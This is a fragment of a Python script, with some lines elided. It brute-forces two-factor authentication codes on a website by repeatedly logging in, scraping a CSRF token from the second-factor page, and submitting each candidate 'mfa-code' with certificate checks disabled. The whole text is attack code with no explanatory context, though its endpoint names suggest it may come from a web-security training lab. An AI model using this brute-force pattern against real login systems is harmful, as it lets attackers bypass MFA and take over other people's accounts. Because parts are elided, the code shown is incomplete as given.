...
for otp in opts:
    if found == True:
        break
    #print(otp,end="\r",flush=True)
    print("{}".format(i),end="\r",flush=True)
    i = i + 1
    r1 = requests.get(url+'login',verify=False)
    ...
    r2 = requests.post(url+'login',data=data,headers=headers,verify=False, allow_redirects=False)
   ...
   # print("Request 2 done",end="\r",flush=True)
    if "Invalid username or password." not in r2.text:
        ...
        r3 = requests.get(url+'login2',headers=headers,verify=False)
        
        #print("Request 3 done",end="\r",flush=True)
        #print(r3.text)
        csrf = re.search('csrf"\ value="(.*?)">',r3.text).group(1)
        data = {'csrf': csrf,'mfa-code': str(otp)[:-1]}
        r4 = requests.post(url+'login2',headers=headers,data=data,verify=False,allow_redirects=False)
